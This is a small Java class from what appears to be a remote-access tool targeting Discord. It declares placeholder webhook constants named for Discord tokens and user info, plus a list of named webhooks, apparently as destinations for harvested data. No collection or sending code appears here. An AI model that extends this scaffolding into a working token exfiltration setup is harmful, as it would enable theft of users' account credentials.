package com.bechris100.remote4j.discord;

import java.util.ArrayList;
import java.util.List;

public class WebhookData {

    @Deprecated
    public static final String DISCORD_TOKENS = "TOKENS_WEBHOOK_URL";

    @Deprecated
    public static final String USER_INFO = "USER_INFO_WEBHOOK_URL";

    public static List<WebhookInfo> webhookDataList = new ArrayList<>();

    public record WebhookInfo(String name, String url) {
    }

}
